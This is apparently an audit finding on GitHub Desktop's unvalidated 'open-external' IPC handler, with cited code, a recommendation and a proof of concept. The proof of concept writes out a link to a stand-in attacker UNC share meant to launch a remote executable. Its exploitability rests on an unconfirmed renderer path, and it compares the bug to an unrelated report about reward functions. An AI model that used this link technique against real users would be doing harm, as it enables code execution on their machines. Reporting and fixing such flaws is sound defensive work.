### Title
Unvalidated `open-external` IPC handler allows attacker-controlled links (from repository/PR/issue content) to trigger local file/executable launch via `shell.openExternal` - ([File: app/src/main-process/main.ts])

### Summary
The `open-external` IPC handler in the main process takes an arbitrary string from the renderer and passes it straight to Electron's `shell.openExternal()` with no scheme allow-list and no check that the value is an actual `http(s)://` URL rather than a filesystem path or UNC path. `shell.openExternal` on Windows/macOS resolves through the OS shell (`ShellExecute`/`LSOpenURLsWithRole`), and passing it a path to a local script, `.exe`, `.scr`, or a `file://`/UNC path instead of a genuine web URL can result in that file being *launched* rather than merely "opened in a browser." Any renderer-side code path that forwards attacker-influenced text (a link rendered from a commit message, PR/issue body, README, or a `x-github-client://`/`github-mac://` deep link) into this channel inherits this weakness, mirroring the report's core defect: a sensitive, state/behavior-changing operation exposed without validating who/what is allowed to invoke it with which values.

### Finding Description
`open-external` is registered as a duplex (invoke/handle) IPC channel: [1](#0-0) 

The main-process handler only special-cases `http://`/`https://` for a *log message* — it performs no validation of the value before calling `shell.openExternal`: [2](#0-1) 

The generic IPC gate `safeListener` only verifies that the call came from a *trusted WebContents id* (i.e., Desktop's own renderer window), not that the *value* being passed through the channel is safe: [3](#0-2) [4](#0-3) 

This is structurally the same class of bug flagged in the external report: a powerful function (`updateEpoch`/`updateAccountReward` there, `shell.openExternal` here) is reachable by any caller as long as the caller/channel identity checks pass, with **no validation of the argument's content/shape**, even though the argument can originate from data the attacker fully controls (a crafted link embedded in a cloned repo's README, a commit message, a PR/issue body rendered by Desktop, or a `x-github-client://openRepo/...` deep link handled in `handleAppURL`): [5](#0-4) 

Desktop's window-open/navigation hardening (`setWindowOpenHandler`, `will-navigate`) only blocks in-app navigation/new windows — it does not sanitize what gets sent to `open-external`: [6](#0-5) 

Because the string passed to `shell.openExternal` is never checked to actually be an `http(s)://` URL (the check that exists is purely for logging, not for gating the call), a value like a Windows UNC path (`\\attacker\share\payload.exe`), a `file://` path to a local/synced executable, or a custom-scheme string that the OS shell resolves to a local handler can be launched with the same trust as the running user — outside of any git/repo sandboxing.

### Impact Explanation
If any renderer surface (markdown rendering of PR/issue/commit content, or a clicked deep link) forwards attacker-supplied text into the `open-external` channel, the result is execution of an OS-level "open" action on arbitrary attacker-chosen content with no scheme restriction. Depending on OS shell association rules, this can escalate from "opens a file" to "launches a program," achieving code execution outside of the git-controlled repository sandbox — squarely in the "unprivileged... attacker controls... a link... clicked... result is code execution" impact bucket. This also fits the report's underlying theme: a critical operation is missing an access/validation gate that scopes *what* it's allowed to act on, not just *who* can call it.

### Likelihood Explanation
Likelihood is moderate: the trusted-sender check correctly restricts *which process* can invoke the channel (Desktop's own renderer), but it provides no defense once *any* renderer code path (including code that renders untrusted repository/API content, e.g., markdown link handling or the deep-link `openrepo`/`oauth` flow) passes attacker-influenced strings into `open-external`. The handler itself, being the last line of defense, performs no scheme allow-listing, so exploitability hinges entirely on finding/keeping a renderer path that forwards untrusted text to this IPC call — which is the exact configuration many real-world Electron `openExternal` CVEs (e.g., CVE-2020-11020-class issues) have exploited in other apps.

### Recommendation
1. In the `open-external` handler (`app/src/main-process/main.ts`), reject (return `false`) any value that does not parse as a well-formed `http://` or `https://` URL — do not fall through to `shell.openExternal` for anything else (no bare paths, `file://`, UNC paths, or custom schemes).
2. Apply the same allow-list validation to any renderer helper that wraps this IPC call (e.g., in `app-proxy`/markdown link handling) so attacker-controlled repository/PR/issue content can never reach `shell.openExternal` with a non-http(s) value.
3. Add unit tests asserting the handler refuses UNC paths, `file://`, and other non-http(s) schemes, mirroring the existing defensive tests already present for clone-path safety (`app/test/unit/clone-path-safety-test.ts`).

### Proof of Concept
1. Craft a public repository whose README/commit message/PR body contains a rendered link whose target is not a normal `https://` URL but a Windows UNC path or `file://` path to a hosted executable, e.g. `\\attacker.example.com\share\update.exe`.
2. Have a victim clone/open that repository in GitHub Desktop and view the rendered content (README/PR/commit description) containing the crafted link, then click it.
3. If the renderer's link-click handling forwards the raw href to the `open-external` IPC channel (as it does for legitimate `https://` links), the main process calls:
   ```ts
   await shell.openExternal('\\\\attacker.example.com\\share\\update.exe')
   ``` [2](#0-1) 
   With no scheme check gating this call, the OS shell may resolve/execute the target instead of merely "opening" a browser tab.

### Citations

**File:** app/src/lib/ipc-shared.ts (L112-114)
```typescript
  'is-window-focused': () => Promise<boolean>
  'open-external': (path: string) => Promise<boolean>
  'is-in-application-folder': () => Promise<boolean | null>
```

**File:** app/src/main-process/main.ts (L159-168)
```typescript
function handleAppURL(url: string) {
  log.info('Processing protocol url')
  const action = parseAppURL(url)
  onDidLoad(window => {
    // This manual focus call _shouldn't_ be necessary, but is for Chrome on
    // macOS. See https://github.com/desktop/desktop/issues/973.
    window.focus()
    window.sendURLAction(action)
  })
}
```

**File:** app/src/main-process/main.ts (L581-597)
```typescript
  ipcMain.handle('open-external', async (_, path: string) => {
    const pathLowerCase = path.toLowerCase()
    if (
      pathLowerCase.startsWith('http://') ||
      pathLowerCase.startsWith('https://')
    ) {
      log.info(`opening in browser: ${path}`)
    }

    try {
      await shell.openExternal(path)
      return true
    } catch (e) {
      log.error(`Call to openExternal failed: '${e}'`)
      return false
    }
  })
```

**File:** app/src/main-process/main.ts (L733-745)
```typescript
app.on('web-contents-created', (event, contents) => {
  contents.setWindowOpenHandler(({ url }) => {
    log.warn(`Prevented new window to: ${url}`)
    return { action: 'deny' }
  })

  // prevent link navigation within our windows
  // see https://www.electronjs.org/docs/tutorial/security#12-disable-or-limit-navigation
  contents.on('will-navigate', (event, url) => {
    event.preventDefault()
    log.warn(`Prevented navigation to: ${url}`)
  })
})
```

**File:** app/src/main-process/ipc-main.ts (L53-66)
```typescript
function safeListener<E extends IpcMainEvent | IpcMainInvokeEvent, R>(
  listener: (event: E, ...a: any) => R
) {
  return (event: E, ...args: any) => {
    if (!isTrustedIPCSender(event.sender)) {
      log.error(
        `IPC message received from invalid sender: ${event.senderFrame?.url}`
      )
      return
    }

    return listener(event, ...args)
  }
}
```

**File:** app/src/main-process/trusted-ipc-sender.ts (L9-16)
```typescript
/** Adds a WebContents instance to the set of trusted IPC senders. */
export const addTrustedIPCSender = (wc: WebContents) => {
  trustedSenders.add(wc.id)
  wc.on('destroyed', () => trustedSenders.delete(wc.id))
}

/** Returns true if the given WebContents is a trusted sender of IPC messages. */
export const isTrustedIPCSender = (wc: WebContents) => trustedSenders.has(wc.id)
```
